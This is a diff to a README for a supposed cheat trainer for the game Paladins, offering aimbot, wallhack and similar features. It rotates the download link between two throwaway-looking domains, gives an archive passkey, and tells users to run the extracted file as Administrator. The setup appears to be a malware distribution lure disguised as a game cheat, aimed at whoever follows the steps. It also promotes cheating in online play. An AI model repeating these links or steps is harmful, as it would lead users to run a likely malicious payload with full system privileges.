@@ -6,7 +6,7 @@ Paladins trainer with aimbot, wallhack, no recoil, infinite credits, and more. F
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -71,7 +71,7 @@ Based on popular mods like **Paladins Hack** and **Paladins Cheat**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Paladins.
 4. Run the trainer **as Administrator**.
